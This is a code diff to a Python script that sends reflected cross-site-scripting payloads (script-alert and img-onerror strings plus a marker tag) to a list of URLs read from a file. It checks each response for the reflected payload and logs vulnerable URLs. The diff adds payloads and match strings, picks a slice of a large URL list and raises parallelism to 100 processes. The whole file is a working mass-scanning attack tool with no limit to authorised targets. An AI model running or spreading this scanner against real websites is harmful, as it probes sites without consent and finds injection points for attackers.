@@ -1,15 +1,18 @@
 #!/usr/bin/env python
 
-import requests
+import requests, random
 from multiprocessing import Pool
 
 
 urls = []
 
 attackPatterns = [
-    '"><script>alert(\'XSS\');</script>',
-    '--><script>alert(\'XSS\');</script><!--',
-
+    ('"><script>alert(\'XSS\');</script>', '"><script>alert(\'XSS\');</script>'),
+    ('--><script>alert(\'XSS\');</script><!--', '--><script>alert(\'XSS\');</script><!--'),
+    ('\'><script>alert(\'XSS\');</script><!--', '\'><script>alert(\'XSS\');</script><!--'),
+    ('\'\';!--"<AEgHKsikgaE>=&{()}', '<AEgHKsikgaE>'),
+    ('<img src=0 onerror=alert(1)>', '<img src=0 onerror=alert(1)>'),
+    ('--><script>alert(\'XSS\');</script>', '--><script>alert(\'XSS\');</script>')
 ]
 
 
@@ -65,7 +68,11 @@ class Url:
         return buf
 
     def getUrl(self):
-        return self.protocoll + self.domain + self.path + '?' + self.getParameterString()
+        parameterString = self.getParameterString()
+        if parameterString == '':
+            return self.protocoll + self.domain + self.path
+        else:
+            return self.protocoll + self.domain + self.path + '?' + self.getParameterString()
 
     def setParamters(self, p):
         for (key, value) in p.items():
@@ -94,21 +101,22 @@ def attack(url):
     for ap in attackPatterns:
         # attack plain get url
         try:
-            r = requests.get(url.getUrl() + ap, timeout=10)
-            if ap in r.text:
-                res.addSuccessPatterns(url.getUrl() + ap)
-
+            r = requests.get(url.getUrl() + ap[0], timeout=10)
+            if ap[1] in r.text:
+                res.addSuccessPatterns(url.getUrl() + ap[0])
+            
             # attack get parameters
             injectedParameters = {}
 
-            for key, _ in url.parameters.items():
-                injectedParameters[key] = ap
-            url.setParamters(injectedParameters)
+            if len(url.parameters.items()) != 0:
+                for key, _ in url.parameters.items():
+                    injectedParameters[key] = ap[0]
+                url.setParamters(injectedParameters)
 
-            r = requests.get(url.getUrl(), timeout=10)
+                r = requests.get(url.getUrl(), timeout=10)
 
-            if ap in r.text:
-                res.addSuccessPatterns(url.getUrl())
+                if ap[1] in r.text:
+                    res.addSuccessPatterns(url.getUrl())
         except:
             pass
     return res
@@ -118,9 +126,9 @@ def main():
     res = []
 
     with open('urls.txt', 'r', encoding="utf-8", errors="surrogateescape") as infile:
-        urls = [u.rstrip() for u in infile.readlines()]
+        urls = [u.rstrip() for u in infile.readlines()[2000:3000]]
 
-    with Pool(processes=10) as pool:
+    with Pool(processes=100) as pool:
         res = pool.map(attack, [Url(url) for url in urls])
 
     buf = ''
